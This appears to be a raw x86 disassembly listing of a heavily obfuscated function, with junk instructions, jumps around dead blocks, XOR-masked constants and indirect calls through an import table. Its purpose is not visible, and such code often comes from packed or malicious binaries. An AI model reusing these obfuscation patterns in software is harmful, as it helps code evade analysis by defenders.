  420572:	mov    DWORD PTR [ebp-0x114],0x6985
  42057c:	mov    DWORD PTR [ebp-0x14],0x5627
  420583:	mov    DWORD PTR [ebp-0x64],0x72e7
  42058a:	not    DWORD PTR ds:0x42293a
  420590:	mov    eax,DWORD PTR [ebp-0x14]
  420593:	cmp    DWORD PTR ds:0x4228be,0x0
  42059a:	mov    DWORD PTR ds:0x4228c2,edx
  4205a0:	mov    DWORD PTR ds:0x42299e,0x4cb1
  4205aa:	movzx  ecx,WORD PTR ds:0x4228a2
  4205b1:	jmp    0x420661
  4205b6:	mov    DWORD PTR ds:0x4228e2,0x2b18
  4205c0:	jl     0x4205f1
  4205c6:	push   DWORD PTR [ebp-0x28]
  4205c9:	push   0x68d6
  4205ce:	push   0x1f9a
  4205d3:	push   0x3f36
  4205d8:	push   DWORD PTR [ebp-0x14]
  4205db:	call   DWORD PTR ds:0x42a1d0
  4205e1:	and    DWORD PTR ds:0x422972,edi
  4205e7:	sub    DWORD PTR ds:0x4229a6,0x3838
  4205f1:	sub    DWORD PTR ds:0x422926,0x422946
  4205fb:	sub    DWORD PTR ds:0x42288e,edi
  420601:	inc    ecx
  420602:	cmp    DWORD PTR ds:0x4228da,0x0
  420609:	mov    DWORD PTR ds:0x422916,edi
  42060f:	mov    DWORD PTR ds:0x4228c2,0x3e4f
  420619:	mov    ecx,0x124e
  42061e:	jmp    0x420661
  420623:	movzx  ecx,WORD PTR ds:0x4228fa
  42062a:	jg     0x42064f
  420630:	push   0x110e
  420635:	call   DWORD PTR ds:0x42a1d4
  42063b:	mov    ecx,DWORD PTR ds:0x42292e
  420641:	sub    DWORD PTR ds:0x4229ba,ecx
  420647:	not    ecx
  420649:	sub    ecx,0x3ff2
  42064f:	sbb    DWORD PTR ds:0x4229b2,ecx
  420655:	mov    ecx,DWORD PTR ds:0x4229ba
  42065b:	or     DWORD PTR ds:0x422996,ecx
  420661:	add    eax,DWORD PTR [ebp-0x64]
  420664:	cmp    DWORD PTR ds:0x42296a,0x0
  42066b:	mov    DWORD PTR ds:0x4229b6,edx
  420671:	mov    DWORD PTR ds:0x4228ce,0x892
  42067b:	mov    DWORD PTR ds:0x42295a,0x70ff
  420685:	mov    DWORD PTR ds:0x42292e,edi
  42068b:	jmp    0x4206f0
  420690:	mov    DWORD PTR ds:0x4228ea,0x2b24
  42069a:	jge    0x4206ce
  4206a0:	call   DWORD PTR ds:0x42a2ec
  4206a6:	xor    DWORD PTR ds:0x4229ce,ebx
  4206ac:	mov    ecx,DWORD PTR ds:0x422902
  4206b2:	or     ecx,DWORD PTR ds:0x422976
  4206b8:	mov    DWORD PTR ds:0x422902,ecx
  4206be:	and    ecx,DWORD PTR ds:0x42293e
  4206c4:	sub    DWORD PTR ds:0x4228fe,0x422922
  4206ce:	add    DWORD PTR ds:0x422952,ecx
  4206d4:	and    ecx,DWORD PTR ds:0x4228c6
  4206da:	adc    ecx,DWORD PTR ds:0x42290e
  4206e0:	sub    ecx,DWORD PTR ds:0x4228a2
  4206e6:	and    DWORD PTR ds:0x42295e,0x60c
  4206f0:	mov    ecx,DWORD PTR [ebp-0x114]
  4206f6:	sub    DWORD PTR ds:0x4229ba,0x175
  420700:	sub    eax,ecx
  420702:	mov    ecx,DWORD PTR [ebp-0x128]
  420708:	and    DWORD PTR ds:0x42288e,0x7a1c
  420712:	imul   eax,ecx
  420715:	imul   eax,eax,0xe4e
  42071b:	neg    ecx
  42071d:	mov    ecx,DWORD PTR [ebp-0x7c]
  420720:	and    DWORD PTR ds:0x42288e,0x4228ea
  42072a:	or     eax,ecx
  42072c:	mov    ecx,DWORD PTR [ebp+0x8]
  42072f:	lea    eax,[ecx+eax*1+0x46210209]
  420736:	xor    DWORD PTR ds:0x42291a,0x563e
  420740:	push   eax
  420741:	sub    DWORD PTR ds:0x422926,0x42288e
  42074b:	call   0x41d101
  420750:	neg    ecx
  420752:	mov    ecx,eax
  420754:	mov    eax,DWORD PTR [ebp-0xc4]
  42075a:	sub    esi,0x184b
  420760:	imul   eax,eax,0x21b3
  420766:	and    esi,DWORD PTR ds:0x42297a
  42076c:	add    eax,DWORD PTR [ebp-0xe4]
  420772:	and    eax,0xd5c
  420777:	and    DWORD PTR ds:0x422952,0x302e
  420781:	sub    eax,0x2e81
  420786:	or     esi,DWORD PTR ds:0x4228ea
  42078c:	xor    edx,edx
  42078e:	mov    esi,0x2f1dc
  420793:	or     DWORD PTR ds:0x422942,0x422976
  42079d:	div    esi
  42079f:	xor    eax,0x56ef
  4207a4:	cmp    DWORD PTR ds:0x422946,0x0
  4207ab:	mov    DWORD PTR ds:0x422916,edi
  4207b1:	mov    DWORD PTR ds:0x422966,0x662c
  4207bb:	mov    DWORD PTR ds:0x4229d2,edi
  4207c1:	jmp    0x4208e1
  4207c6:	mov    DWORD PTR ds:0x4229ce,0x4f06
  4207d0:	jg     0x4207eb
  4207d6:	push   DWORD PTR [ebp-0x20]
  4207d9:	call   DWORD PTR ds:0x42a1d8
  4207df:	sub    esi,DWORD PTR ds:0x42288e
  4207e5:	sub    DWORD PTR ds:0x4229ba,edx
  4207eb:	or     esi,esi
  4207ed:	add    edx,0x7894
  4207f3:	mov    esi,DWORD PTR ds:0x4229f6
  4207f9:	mov    edx,DWORD PTR ds:0x422a52
  4207ff:	sub    edx,esi
  420801:	imul   esi,DWORD PTR [esi+edx*1]
  420805:	xor    edx,DWORD PTR ds:0x422896
  42080b:	cmp    DWORD PTR ds:0x42295e,0x0
  420812:	mov    DWORD PTR ds:0x4228ea,0x1c26
  42081c:	mov    DWORD PTR ds:0x4229b2,edx
  420822:	jmp    0x4208e1
  420827:	mov    DWORD PTR ds:0x422962,0x1de8
  420831:	jb     0x420860
  420837:	push   DWORD PTR [ebp-0xc]
  42083a:	push   0x797e
  42083f:	push   DWORD PTR [ebp-0x28]
  420842:	push   DWORD PTR [ebp-0x20]
  420845:	push   DWORD PTR [ebp-0x20]
  420848:	call   DWORD PTR ds:0x42a0a0
  42084e:	xor    edx,0x2ce5
  420854:	adc    DWORD PTR ds:0x422946,edi
  42085a:	sub    DWORD PTR ds:0x4229ca,edx
  420860:	xor    edx,esi
  420862:	and    esi,edx
  420864:	mov    edx,DWORD PTR ds:0x4229e2
  42086a:	mov    esi,DWORD PTR ds:0x422ab2
  420870:	sub    edx,esi
  420872:	xor    edx,DWORD PTR [edx+esi*1]
  420875:	cmp    DWORD PTR ds:0x42298a,0x0
  42087c:	mov    DWORD PTR ds:0x4228d6,edx
  420882:	movzx  edx,WORD PTR ds:0x422896
  420889:	mov    edx,0x6c32
  42088e:	jmp    0x4208e1
  420893:	mov    DWORD PTR ds:0x422896,0x27d5
  42089d:	mov    DWORD PTR ds:0x4228a2,0x76ec
  4208a7:	jb     0x4208cf
  4208ad:	push   DWORD PTR [ebp-0x28]
  4208b0:	push   DWORD PTR [ebp-0x28]
  4208b3:	call   DWORD PTR ds:0x42a0a4
  4208b9:	adc    edx,0x3a8d
  4208bf:	and    DWORD PTR ds:0x422976,0x6cff
  4208c9:	or     DWORD PTR ds:0x422992,ebx
  4208cf:	xor    edx,DWORD PTR ds:0x42299a
  4208d5:	inc    DWORD PTR ds:0x4229ba
  4208db:	and    DWORD PTR ds:0x422932,edx
  4208e1:	add    ecx,eax
  4208e3:	mov    DWORD PTR [ebp-0x90],ecx
  4208e9:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4208f3:	inc    esi
  4208f4:	mov    DWORD PTR [ebp-0x44],0x2514
  4208fb:	xor    eax,eax
  4208fd:	or     eax,DWORD PTR ds:0x4228ee
  420903:	xor    DWORD PTR ds:0x422932,eax
  420909:	mov    DWORD PTR [ebp-0xdc],0x699c
  420913:	sbb    edx,ecx
  420915:	mov    DWORD PTR [ebp-0xd8],0x1
  42091f:	mov    DWORD PTR [ebp-0x24],0x7901
  420926:	cmp    DWORD PTR ds:0x422976,0x0
  42092d:	not    edx
  42092f:	mov    DWORD PTR ds:0x4228a2,0x569b
  420939:	mov    DWORD PTR ds:0x4228a6,0x4d6f
  420943:	mov    DWORD PTR ds:0x42297e,edx
  420949:	jmp    0x420998
  42094e:	mov    DWORD PTR ds:0x422976,edx
  420954:	mov    DWORD PTR ds:0x4228fa,ecx
  42095a:	je     0x42097c
  420960:	push   0x5aed
  420965:	push   0x6c8d
  42096a:	call   DWORD PTR ds:0x42a2f0
  420970:	xor    DWORD PTR ds:0x42293a,0x1a42
  42097a:	adc    esi,ecx
  42097c:	adc    edx,DWORD PTR ds:0x4228d6
  420982:	and    ecx,0x55be
  420988:	sbb    DWORD PTR ds:0x42290a,0x346b
  420992:	add    ecx,0x18f
  420998:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  4209a2:	mov    eax,ds:0x422ab6
  4209a7:	mov    eax,DWORD PTR [eax]
  4209a9:	sub    DWORD PTR ds:0x4228ce,eax
  4209af:	mov    DWORD PTR [ebp-0x78],0x37f2
  4209b6:	or     DWORD PTR ds:0x4229b2,edx
  4209bc:	mov    DWORD PTR [ebp-0x10],0x62ba
  4209c3:	mov    DWORD PTR [ebp-0x94],0x561c
  4209cd:	adc    DWORD PTR ds:0x4228e6,0x1c9a
  4209d7:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209de:	xor    DWORD PTR ds:0x4228a2,edi
  4209e4:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209eb:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209f2:	or     esi,ecx
  4209f4:	mov    eax,DWORD PTR [ebp-0x34]
  4209f7:	adc    esi,DWORD PTR ds:0x422936
  4209fd:	mov    ecx,DWORD PTR [ebp-0x60]
  420a00:	mov    edx,DWORD PTR ds:0x4228ea
  420a06:	add    DWORD PTR ds:0x42292e,edx
  420a0c:	mov    edx,DWORD PTR [ebp-0x5c]
  420a0f:	xor    DWORD PTR ds:0x4228b2,ecx
  420a15:	and    edx,0x160e
  420a1b:	neg    esi
  420a1d:	sub    edx,ecx
  420a1f:	sub    edx,0x29ad
  420a25:	or     esi,ecx
  420a27:	imul   edx,eax
  420a2a:	cmp    DWORD PTR ds:0x42292e,0x0
  420a31:	mov    ecx,DWORD PTR ds:0x4229c6
  420a37:	mov    DWORD PTR ds:0x4229c6,0x2cb4
  420a41:	mov    esi,0x7aa2
  420a46:	jmp    0x420a86
  420a4b:	mov    DWORD PTR ds:0x4228e2,edx
  420a51:	mov    eax,ds:0x422996
  420a56:	jb     0x420a7e
  420a5c:	push   DWORD PTR [ebp-0x10]
  420a5f:	call   DWORD PTR ds:0x42a1dc
  420a65:	sbb    DWORD PTR ds:0x422986,edx
  420a6b:	xor    esi,esi
  420a6d:	add    esi,DWORD PTR ds:0x4229e6
  420a73:	mov    ecx,DWORD PTR ds:0x422a76
  420a79:	sub    ecx,esi
  420a7b:	xor    esi,DWORD PTR [esi+ecx*1]
  420a7e:	and    ecx,esi
  420a80:	dec    DWORD PTR ds:0x42289a
  420a86:	mov    eax,DWORD PTR [ebp-0x90]
  420a8c:	lea    eax,[eax+edx*1+0x14f2e240]
  420a93:	sub    ecx,DWORD PTR ds:0x42296e
  420a99:	mov    DWORD PTR [ebp-0x174],eax
  420a9f:	mov    eax,DWORD PTR [ebp-0x24]
  420aa2:	and    DWORD PTR ds:0x422896,0x422952
  420aac:	mov    ecx,DWORD PTR [ebp-0x94]
  420ab2:	mov    edx,DWORD PTR [ebp-0x10]
  420ab5:	xor    edx,ecx
  420ab7:	cmp    DWORD PTR ds:0x4228be,0x0
  420abe:	not    esi
  420ac0:	mov    DWORD PTR ds:0x422946,0x4c6a
  420aca:	jmp    0x420b2a
  420acf:	mov    DWORD PTR ds:0x42293e,0x2e5b
  420ad9:	not    DWORD PTR ds:0x4229ae
  420adf:	jae    0x420b1a
  420ae5:	push   DWORD PTR [ebp-0xc]
  420ae8:	push   0x4ad9
  420aed:	push   0x541c
  420af2:	push   0x4226c9
  420af7:	push   0x8f89
  420afc:	call   DWORD PTR ds:0x42a2f4
  420b02:	sbb    esi,0x7b5f
  420b08:	or     DWORD PTR ds:0x4228f6,0x55a2
  420b12:	sbb    DWORD PTR ds:0x4228ee,ebx
  420b18:	neg    ecx
  420b1a:	xor    ecx,ecx
  420b1c:	add    esi,esi
  420b1e:	sub    esi,esi
  420b20:	or     DWORD PTR ds:0x42298e,0x3de5
  420b2a:	add    edx,DWORD PTR [ebp-0x78]
  420b2d:	adc    ecx,DWORD PTR ds:0x4228de
  420b33:	mov    ecx,DWORD PTR [ebp-0xc0]
  420b39:	lea    ecx,[edx+ecx*1+0x6ac1]
  420b40:	and    ecx,eax
  420b42:	mov    eax,0x1101
  420b47:	cmp    DWORD PTR ds:0x42294e,0x0
  420b4e:	mov    DWORD PTR ds:0x4228fe,0x36ab
  420b58:	mov    esi,DWORD PTR ds:0x4228b6
  420b5e:	mov    edx,0x20e8
  420b63:	jmp    0x420bb5
  420b68:	mov    esi,DWORD PTR ds:0x42299a
  420b6e:	ja     0x420ba2
  420b74:	push   0x4228a2
  420b79:	push   0x42299a
  420b7e:	push   0x42293a
  420b83:	call   DWORD PTR ds:0x42a0a8
  420b89:	adc    edx,0x5974
  420b8f:	movzx  esi,BYTE PTR ds:0x422952
  420b96:	xor    DWORD PTR ds:0x4228ce,esi
  420b9c:	or     DWORD PTR ds:0x422926,ecx
  420ba2:	or     edx,DWORD PTR ds:0x4228ce
  420ba8:	movzx  edx,WORD PTR ds:0x4229b6
  420baf:	sub    DWORD PTR ds:0x42299e,edx
  420bb5:	sub    eax,ecx
  420bb7:	add    eax,DWORD PTR [ebp+0x8]
  420bba:	mov    DWORD PTR [ebp-0x170],eax
  420bc0:	cmp    DWORD PTR ds:0x422952,0x0
  420bc7:	mov    DWORD PTR ds:0x42289a,0x4ae9
  420bd1:	mov    DWORD PTR ds:0x422896,0x6df4
  420bdb:	mov    DWORD PTR ds:0x422902,0x1097
  420be5:	mov    esi,0x562b
  420bea:	jmp    0x420c44
  420bef:	not    eax
  420bf1:	mov    DWORD PTR ds:0x422896,ebx
  420bf7:	jae    0x420c34
  420bfd:	push   0x61a8
  420c02:	push   0x28f0
  420c07:	push   0x2a61
  420c0c:	push   0x1d7f
  420c11:	push   DWORD PTR [ebp-0xc]
  420c14:	push   DWORD PTR [ebp-0x24]
  420c17:	push   0x73d0
  420c1c:	call   DWORD PTR ds:0x42a1e0
  420c22:	adc    edx,0x4a39
  420c28:	xor    edx,esi
  420c2a:	or     DWORD PTR ds:0x422946,0x6558
  420c34:	sub    esi,0x4c5d
  420c3a:	xor    DWORD PTR ds:0x4228d2,0x124
  420c44:	mov    DWORD PTR [ebp-0x15c],0xba699573
  420c4e:	mov    DWORD PTR [ebp-0x158],0x9c0a89d8
  420c58:	mov    DWORD PTR [ebp-0x154],0xba699577
  420c62:	sbb    DWORD PTR ds:0x422956,edi
  420c68:	mov    DWORD PTR [ebp-0x150],0x9c0a89d8
  420c72:	or     esi,0x7211
  420c78:	mov    esi,DWORD PTR [ebp-0x174]
  420c7e:	mov    eax,DWORD PTR [ebp-0x154]
  420c84:	mov    edx,DWORD PTR [ebp-0x150]
  420c8a:	sbb    DWORD PTR ds:0x42292e,0x5043
  420c94:	xor    eax,0xba699573
  420c99:	sub    DWORD PTR ds:0x4228fa,0x6217
  420ca3:	xor    edx,0x9c0a89d8
  420ca9:	mov    cl,0x2
  420cab:	call   0x41a184
  420cb0:	cmp    DWORD PTR ds:0x4229aa,0x0
  420cb7:	mov    DWORD PTR ds:0x422936,0x7dfa
  420cc1:	mov    ebx,DWORD PTR ds:0x422896
  420cc7:	not    ebx
  420cc9:	mov    ebx,0x627c
  420cce:	jmp    0x420d22
  420cd3:	mov    DWORD PTR ds:0x422892,0x500b
  420cdd:	mov    DWORD PTR ds:0x4229a6,0x12a3
  420ce7:	jle    0x420d13
  420ced:	push   DWORD PTR [ebp-0xc]
  420cf0:	push   0x7ce6
  420cf5:	push   DWORD PTR [ebp-0x28]
  420cf8:	call   DWORD PTR ds:0x42a2f8
  420cfe:	add    ebx,0x3114
  420d04:	movzx  ebx,BYTE PTR ds:0x4229ae
  420d0b:	add    DWORD PTR ds:0x422922,ebx
  420d11:	and    ebx,ebx
  420d13:	inc    ebx
  420d14:	neg    ebx
  420d16:	xor    edi,DWORD PTR ds:0x422962
  420d1c:	xor    ebx,DWORD PTR ds:0x4228ba
  420d22:	mov    edi,eax
  420d24:	mov    ebx,edx
  420d26:	and    edx,DWORD PTR ds:0x422902
  420d2c:	mov    eax,DWORD PTR [ebp-0x154]
  420d32:	mov    edx,DWORD PTR [ebp-0x150]
  420d38:	xor    eax,0xba699573
  420d3d:	xor    edx,0x9c0a89d8
  420d43:	mov    cl,0x3e
  420d45:	adc    DWORD PTR ds:0x4228ea,0x4228ee
  420d4f:	call   0x421c1c
  420d54:	or     edi,eax
  420d56:	or     ebx,edx
  420d58:	cmp    DWORD PTR ds:0x422912,0x0
  420d5f:	mov    DWORD PTR ds:0x422992,ecx
  420d65:	mov    DWORD PTR ds:0x4228d2,edi
  420d6b:	not    edx
  420d6d:	mov    edx,0x3bde
  420d72:	jmp    0x420dc3
  420d77:	not    eax
  420d79:	mov    eax,ds:0x422922
  420d7e:	jne    0x420db1
  420d84:	push   0x10a6
  420d89:	call   DWORD PTR ds:0x42a0ac
  420d8f:	xor    DWORD PTR ds:0x4228ea,0x6213
  420d99:	mov    edx,DWORD PTR ds:0x422ad6
  420d9f:	mov    edx,DWORD PTR [edx]
  420da1:	sub    DWORD PTR ds:0x4228ea,edx
  420da7:	adc    DWORD PTR ds:0x42297e,0x796e
  420db1:	sub    DWORD PTR ds:0x42291e,ebx
  420db7:	sbb    edx,0x242b
  420dbd:	sbb    edx,DWORD PTR ds:0x42291a
  420dc3:	mov    eax,DWORD PTR [ebp-0x15c]
  420dc9:	neg    edx
  420dcb:	mov    edx,DWORD PTR [ebp-0x158]
  420dd1:	sub    DWORD PTR ds:0x4228b6,0x5dbf
  420ddb:	xor    eax,0xba699573
  420de0:	sbb    DWORD PTR ds:0x422942,0x2b75
  420dea:	xor    edx,0x9c0a89d8
  420df0:	mov    cl,0x2
  420df2:	adc    DWORD PTR ds:0x422966,0x1945
  420dfc:	call   0x41a184
  420e01:	mov    ecx,edx
  420e03:	mov    edx,DWORD PTR [ebp-0x15c]
  420e09:	mov    DWORD PTR [ebp-0x218],esi
  420e0f:	mov    esi,DWORD PTR [ebp-0x158]
  420e15:	xor    edx,0xba699573
  420e1b:	xor    esi,0x9c0a89d8
  420e21:	mov    DWORD PTR [ebp-0x21c],eax
  420e27:	mov    eax,edx
  420e29:	mov    edx,esi
  420e2b:	mov    DWORD PTR [ebp-0x220],ecx
  420e31:	mov    cl,0x3e
  420e33:	call   0x421c1c
  420e38:	mov    esi,DWORD PTR [ebp-0x21c]
  420e3e:	or     esi,eax
  420e40:	mov    eax,DWORD PTR [ebp-0x220]
  420e46:	or     eax,edx
  420e48:	push   eax
  420e49:	push   esi
  420e4a:	push   ebx
  420e4b:	push   edi
  420e4c:	call   0x41df90
  420e51:	mov    esi,DWORD PTR [ebp-0x218]
  420e57:	cmp    esi,eax
  420e59:	jne    0x420f0f
  420e5f:	mov    eax,DWORD PTR [ebp-0x154]
  420e65:	mov    edx,DWORD PTR [ebp-0x150]
  420e6b:	xor    eax,0xba699573
  420e70:	xor    edx,0x9c0a89d8
  420e76:	mov    cl,0x2
  420e78:	call   0x41a184
  420e7d:	mov    esi,eax
  420e7f:	mov    edi,edx
  420e81:	mov    eax,DWORD PTR [ebp-0x154]
  420e87:	mov    edx,DWORD PTR [ebp-0x150]
  420e8d:	xor    eax,0xba699573
  420e92:	xor    edx,0x9c0a89d8
  420e98:	mov    cl,0x3e
  420e9a:	call   0x421c1c
  420e9f:	or     esi,eax
  420ea1:	or     edi,edx
  420ea3:	mov    eax,DWORD PTR [ebp-0x15c]
  420ea9:	mov    edx,DWORD PTR [ebp-0x158]
  420eaf:	xor    eax,0xba699573
  420eb4:	xor    edx,0x9c0a89d8
  420eba:	mov    cl,0x2
  420ebc:	call   0x41a184
  420ec1:	mov    ebx,eax
  420ec3:	mov    eax,edx
  420ec5:	mov    ecx,DWORD PTR [ebp-0x15c]
  420ecb:	mov    edx,DWORD PTR [ebp-0x158]
  420ed1:	xor    ecx,0xba699573
  420ed7:	xor    edx,0x9c0a89d8
  420edd:	mov    DWORD PTR [ebp-0x224],eax
  420ee3:	mov    eax,ecx
  420ee5:	mov    cl,0x3e
  420ee7:	call   0x421c1c
  420eec:	or     ebx,eax
  420eee:	mov    eax,DWORD PTR [ebp-0x224]
  420ef4:	or     eax,edx
  420ef6:	push   eax
  420ef7:	push   ebx
  420ef8:	push   edi
  420ef9:	push   esi
  420efa:	call   0x41df90
  420eff:	mov    DWORD PTR [ebp-0x178],eax
  420f05:	jmp    0x4211cf
  420f0a:	jmp    0x421185
  420f0f:	lea    eax,[ebp-0x168]
  420f15:	mov    DWORD PTR [ebp-0x164],eax
  420f1b:	mov    eax,DWORD PTR [ebp-0x164]
  420f21:	mov    DWORD PTR [eax],0xa3e69a9d
  420f27:	mov    eax,DWORD PTR [ebp-0x168]
  420f2d:	xor    eax,0xa3e69a9d
  420f32:	shr    eax,0x2
  420f35:	mov    ecx,DWORD PTR [ebp-0x168]
  420f3b:	xor    ecx,0xa3e69a9d
  420f41:	shl    ecx,0x1e
  420f44:	or     eax,ecx
  420f46:	mov    ecx,DWORD PTR [ebp-0x174]
  420f4c:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  420f50:	mov    DWORD PTR [ebp-0x160],eax
  420f56:	mov    esi,DWORD PTR [ebp-0x160]
  420f5c:	mov    eax,DWORD PTR [ebp-0x154]
  420f62:	mov    edx,DWORD PTR [ebp-0x150]
  420f68:	xor    eax,0xba699573
  420f6d:	xor    edx,0x9c0a89d8
  420f73:	mov    cl,0x2
  420f75:	call   0x41a184
  420f7a:	mov    edi,eax
  420f7c:	mov    ebx,edx
  420f7e:	mov    eax,DWORD PTR [ebp-0x154]
  420f84:	mov    edx,DWORD PTR [ebp-0x150]
  420f8a:	xor    eax,0xba699573
  420f8f:	xor    edx,0x9c0a89d8
  420f95:	mov    cl,0x3e
  420f97:	call   0x421c1c
  420f9c:	or     edi,eax
  420f9e:	or     ebx,edx
  420fa0:	mov    eax,DWORD PTR [ebp-0x15c]
  420fa6:	mov    edx,DWORD PTR [ebp-0x158]
  420fac:	xor    eax,0xba699573
  420fb1:	xor    edx,0x9c0a89d8
  420fb7:	mov    cl,0x2
  420fb9:	call   0x41a184
  420fbe:	mov    ecx,edx
  420fc0:	mov    edx,DWORD PTR [ebp-0x15c]
  420fc6:	mov    DWORD PTR [ebp-0x228],esi
  420fcc:	mov    esi,DWORD PTR [ebp-0x158]
  420fd2:	xor    edx,0xba699573
  420fd8:	xor    esi,0x9c0a89d8
  420fde:	mov    DWORD PTR [ebp-0x22c],eax
  420fe4:	mov    eax,edx
  420fe6:	mov    edx,esi
  420fe8:	mov    DWORD PTR [ebp-0x230],ecx
  420fee:	mov    cl,0x3e
  420ff0:	call   0x421c1c
  420ff5:	mov    esi,DWORD PTR [ebp-0x22c]
  420ffb:	or     esi,eax
  420ffd:	mov    eax,DWORD PTR [ebp-0x230]
  421003:	or     eax,edx
  421005:	push   eax
  421006:	push   esi
  421007:	push   ebx
  421008:	push   edi
  421009:	call   0x41df90
  42100e:	mov    esi,DWORD PTR [ebp-0x228]
  421014:	cmp    esi,eax
  421016:	je     0x42108b
  42101c:	mov    eax,DWORD PTR [ebp-0x154]
  421022:	mov    edx,DWORD PTR [ebp-0x150]
  421028:	xor    eax,0xba699573
  42102d:	xor    edx,0x9c0a89d8
  421033:	mov    cl,0x2
  421035:	call   0x41a184
  42103a:	mov    esi,eax
  42103c:	mov    edi,edx
  42103e:	mov    eax,DWORD PTR [ebp-0x154]
  421044:	mov    edx,DWORD PTR [ebp-0x150]
  42104a:	xor    eax,0xba699573
  42104f:	xor    edx,0x9c0a89d8
  421055:	mov    cl,0x3e
  421057:	call   0x421c1c
  42105c:	or     esi,eax
  42105e:	or     edi,edx
  421060:	mov    eax,DWORD PTR [ebp-0x160]
  421066:	imul   esi,eax
  421069:	add    esi,DWORD PTR [ebp-0x170]
  42106f:	mov    DWORD PTR [ebp-0x16c],esi
  421075:	mov    eax,DWORD PTR [ebp-0x16c]
  42107b:	mov    DWORD PTR [ebp-0x178],eax
  421081:	jmp    0x4211cf
  421086:	jmp    0x421136
  42108b:	mov    eax,DWORD PTR [ebp-0x154]
  421091:	mov    edx,DWORD PTR [ebp-0x150]
  421097:	xor    eax,0xba699573
  42109c:	xor    edx,0x9c0a89d8
  4210a2:	mov    cl,0x2
  4210a4:	call   0x41a184
  4210a9:	mov    esi,eax
  4210ab:	mov    edi,edx
  4210ad:	mov    eax,DWORD PTR [ebp-0x154]
  4210b3:	mov    edx,DWORD PTR [ebp-0x150]
  4210b9:	xor    eax,0xba699573
  4210be:	xor    edx,0x9c0a89d8
  4210c4:	mov    cl,0x3e
  4210c6:	call   0x421c1c
  4210cb:	or     esi,eax
  4210cd:	or     edi,edx
  4210cf:	mov    eax,DWORD PTR [ebp-0x15c]
  4210d5:	mov    edx,DWORD PTR [ebp-0x158]
  4210db:	xor    eax,0xba699573
  4210e0:	xor    edx,0x9c0a89d8
  4210e6:	mov    cl,0x2
  4210e8:	call   0x41a184
  4210ed:	mov    ebx,eax
  4210ef:	mov    eax,edx
  4210f1:	mov    ecx,DWORD PTR [ebp-0x15c]
  4210f7:	mov    edx,DWORD PTR [ebp-0x158]
  4210fd:	xor    ecx,0xba699573
  421103:	xor    edx,0x9c0a89d8
  421109:	mov    DWORD PTR [ebp-0x234],eax
  42110f:	mov    eax,ecx
  421111:	mov    cl,0x3e
  421113:	call   0x421c1c
  421118:	or     ebx,eax
  42111a:	mov    eax,DWORD PTR [ebp-0x234]
  421120:	or     eax,edx
  421122:	push   eax
  421123:	push   ebx
  421124:	push   edi
  421125:	push   esi
  421126:	call   0x41df90
  42112b:	mov    DWORD PTR [ebp-0x178],eax
  421131:	jmp    0x4211cf
  421136:	mov    eax,DWORD PTR [ebp-0x15c]
  42113c:	mov    edx,DWORD PTR [ebp-0x158]
  421142:	xor    eax,0xba699573
  421147:	xor    edx,0x9c0a89d8
  42114d:	mov    cl,0x2
  42114f:	call   0x41a184
  421154:	mov    esi,eax
  421156:	mov    edi,edx
  421158:	mov    eax,DWORD PTR [ebp-0x15c]
  42115e:	mov    edx,DWORD PTR [ebp-0x158]
  421164:	xor    eax,0xba699573
  421169:	xor    edx,0x9c0a89d8
  42116f:	mov    cl,0x3e
  421171:	call   0x421c1c
  421176:	or     esi,eax
  421178:	or     edi,edx
  42117a:	mov    DWORD PTR [ebp-0x178],esi
  421180:	jmp    0x4211cf
  421185:	mov    eax,DWORD PTR [ebp-0x15c]
  42118b:	mov    edx,DWORD PTR [ebp-0x158]
  421191:	xor    eax,0xba699573
  421196:	xor    edx,0x9c0a89d8
  42119c:	mov    cl,0x2
  42119e:	call   0x41a184
  4211a3:	mov    esi,eax
  4211a5:	mov    edi,edx
  4211a7:	mov    eax,DWORD PTR [ebp-0x15c]
  4211ad:	mov    edx,DWORD PTR [ebp-0x158]
  4211b3:	xor    eax,0xba699573
  4211b8:	xor    edx,0x9c0a89d8
  4211be:	mov    cl,0x3e
  4211c0:	call   0x421c1c
  4211c5:	or     esi,eax
  4211c7:	or     edi,edx
  4211c9:	mov    DWORD PTR [ebp-0x178],esi
  4211cf:	mov    ecx,DWORD PTR [ebp-0xd8]
  4211d5:	mov    eax,0x459a
  4211da:	xor    edx,edx
  4211dc:	div    ecx
  4211de:	mov    ecx,DWORD PTR [ebp-0xdc]
  4211e4:	and    eax,ecx
  4211e6:	add    eax,DWORD PTR [ebp-0x44]
  4211e9:	mov    ecx,DWORD PTR [ebp-0xe0]
  4211ef:	lea    eax,[eax+ecx*1+0x272f]
  4211f6:	xor    eax,0x1080c
  4211fb:	add    eax,DWORD PTR [ebp-0x178]
  421201:	mov    DWORD PTR [ebp-0xe8],eax
  421207:	mov    DWORD PTR [ebp-0xc],0x5950
  42120e:	mov    DWORD PTR [ebp-0xf8],0x4964
  421218:	mov    DWORD PTR [ebp-0x130],0x3
  421222:	mov    DWORD PTR [ebp-0x20],0x2df9
  421229:	mov    DWORD PTR [ebp-0x8],0x4524
  421230:	mov    DWORD PTR [ebp-0xd4],0x637e
  42123a:	mov    DWORD PTR [ebp-0x110],0x38c8
  421244:	mov    DWORD PTR [ebp-0xa4],0x7118
  42124e:	mov    DWORD PTR [ebp-0xa0],0xaf6
  421258:	mov    DWORD PTR [ebp-0x10c],0x3315
  421262:	mov    eax,DWORD PTR [ebp-0xf8]
  421268:	mov    ecx,DWORD PTR [ebp-0x130]
  42126e:	xor    edx,edx
  421270:	div    ecx
  421272:	add    eax,0x454e
  421277:	mov    ecx,DWORD PTR [ebp-0xc]
  42127a:	and    eax,ecx
  42127c:	xor    eax,0x5940
  421281:	add    eax,DWORD PTR [ebp+0x8]
  421284:	mov    ecx,DWORD PTR [ebp-0x110]
  42128a:	mov    edx,DWORD PTR [ebp-0xa4]
  421290:	sub    ecx,edx
  421292:	mov    edx,DWORD PTR [ebp-0xd4]
  421298:	or     ecx,edx
  42129a:	mov    edx,DWORD PTR [ebp-0x8]
  42129d:	and    ecx,edx
  42129f:	mov    edx,DWORD PTR [ebp-0x20]
  4212a2:	xor    ecx,edx
  4212a4:	mov    edx,DWORD PTR [ebp-0x10c]
  4212aa:	mov    esi,0x180f
  4212af:	sub    esi,edx
  4212b1:	mov    edx,DWORD PTR [ebp-0xa0]
  4212b7:	imul   esi,edx
  4212ba:	xor    esi,0x402b
  4212c0:	xor    esi,0xfed78c17
